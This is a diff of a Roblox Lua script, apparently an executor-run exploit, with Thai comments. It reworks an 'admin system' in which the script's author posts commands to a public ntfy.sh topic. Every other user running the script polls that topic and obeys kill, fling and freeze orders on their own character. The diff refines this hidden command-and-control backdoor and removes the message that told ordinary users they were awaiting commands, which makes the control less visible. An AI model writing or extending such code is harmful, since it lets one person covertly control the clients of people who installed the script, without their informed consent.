@@ -100,35 +100,33 @@ ToggleBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ====================================================================
--- 7. ระบบแอดมิน (แก้บั๊กทำซ้ำ & เพิ่มความเร็ว)
+-- 7. ระบบแอดมิน (เวอร์ชันเสถียร 100%)
 -- ====================================================================
-local Channel = "https://ntfy.sh/CORE_LOLASSR5_AdminBus_99X"
-local processedMsgs = {} -- 🛑 ตัวแปรสำหรับจำว่าข้อความนี้ทำไปแล้วหรือยัง
-local isSending = false  -- 🛑 กันกดปุ่มรัวๆ
+local Channel = "https://ntfy.sh/CORE_LOLASSR5_AdminBus_V3"
+local processedIds = {}
 
+-- [ฝั่งแอดมิน]: ส่งคำสั่ง
 local function SendCommand(cmd, targetName)
-    if isSending then return end -- ถ้ากำลังส่งอยู่ ไม่ให้ส่งซ้ำ
-    isSending = true
-    
     task.spawn(function()
-        local data = string.format("%s:%s:%s", cmd, targetName, MyRobloxName)
+        -- สร้าง ID เฉพาะสำหรับคำสั่งนี้ ป้องกันการทำซ้ำ
+        local uniqueId = tostring(os.time()) .. "_" .. tostring(math.random(1000, 9999))
+        -- รูปแบบการส่ง: cmd|target|admin|uniqueId
+        local data = string.format("%s|%s|%s|%s", cmd, targetName, MyRobloxName, uniqueId)
+        
         fireRequest({
             Url = Channel,
             Method = "POST",
             Body = data
         })
-        task.wait(1) -- รอ 1 วิก่อนให้กดใหม่
-        isSending = false
     end)
 end
 
--- [ฝั่งเป้าหมาย]: คอยฟังคำสั่ง (แก้ไขให้เร็วขึ้นและไม่ทำซ้ำ)
+-- [ฝั่งเป้าหมาย]: คอยฟังคำสั่ง
 task.spawn(function()
-    while task.wait(0.5) do -- 🛑 เช็กทุก 0.5 วินาที (เร็วขึ้น 3 เท่า)
+    while task.wait(1.2) do -- เช็กทุก 1.2 วินาที (ปลอดภัยจาก Rate Limit)
         pcall(function()
-            -- ดึงข้อความย้อนหลัง 5 วินาที
             local res = fireRequest({
-                Url = Channel .. "/json?poll=1&since=5s",
+                Url = Channel .. "/json?poll=1&since=10s", -- ดึงย้อนหลัง 10 วิ
                 Method = "GET"
             })
             
@@ -136,16 +134,17 @@ task.spawn(function()
                 for line in res.Body:gmatch("[^\r\n]+") do
                     local success, decoded = pcall(function() return HttpService:JSONDecode(line) end)
                     
-                    if success and decoded and decoded.id and decoded.message then
-                        local msgId = decoded.id
+                    if success and decoded and decoded.message then
+                        -- แยกข้อความด้วยเครื่องหมาย |
+                        local msgCmd, msgTarget, msgAdmin, msgId = decoded.message:match("^(.-)|(.-)|(.-)|(.-)$")
                         
-                        -- 🛑 ถ้าข้อความนี้เคยทำไปแล้ว ให้ข้ามไปเลย (แก้บั๊กทำรัวๆ)
-                        if not processedMsgs[msgId] then
-                            processedMsgs[msgId] = true
-                            
-                            local msgCmd, msgTarget, msgAdmin = decoded.message:match("^(.-):(.-):(.-)$")
-                            
-                            if msgTarget and string.lower(msgTarget) == string.lower(LocalPlayer.Name) then
+                        if msgTarget and msgId then
+                            -- ถ้าเป็นชื่อเรา และยังไม่เคยทำ ID นี้
+                            if string.lower(msgTarget) == string.lower(LocalPlayer.Name) and not processedIds[msgId] then
+                                processedIds[msgId] = true -- มาร์กว่าทำแล้ว
+                                
+                                print("[CORE ADMIN] ได้รับคำสั่ง:", msgCmd, "จาก:", msgAdmin) -- โชว์ใน F9
+                                
                                 local myChar = LocalPlayer.Character
                                 local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                                 local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
@@ -159,8 +158,8 @@ task.spawn(function()
                                     if myHum then myHum.Health = 0 end
                                 elseif msgCmd == "fling" then
                                     if myHRP then
-                                        myHRP.Velocity = Vector3.new(math.random(-1000, 1000), 1000, math.random(-1000, 1000))
-                                        myHRP.RotVelocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
+                                        myHRP.Velocity = Vector3.new(math.random(-500, 500), 1000, math.random(-500, 500))
+                                        myHRP.RotVelocity = Vector3.new(math.random(-200, 200), math.random(-200, 200), math.random(-200, 200))
                                     end
                                 elseif msgCmd == "freeze" then
                                     if myHRP and myHum then
@@ -243,7 +242,7 @@ if string.lower(LocalPlayer.Name) == string.lower(MyRobloxName) then
                 SendCommand(cmd, Input.Text)
                 local oldText = btn.Text
                 btn.Text = "✅ ส่งแล้ว!"
-                task.wait(0.8)
+                task.wait(1)
                 btn.Text = oldText
             end
         end)
@@ -265,8 +264,4 @@ if string.lower(LocalPlayer.Name) == string.lower(MyRobloxName) then
             end
         end
     end)
-
-    print("✅ [CORE] ยินดีต้อนรับแอดมิน LOLASSR5! เมนูพร้อมใช้งาน")
-else
-    print("✅ [CORE] โหลดสำเร็จ! (คุณคือผู้เล่นทั่วไป รอรับคำสั่ง)")
 end
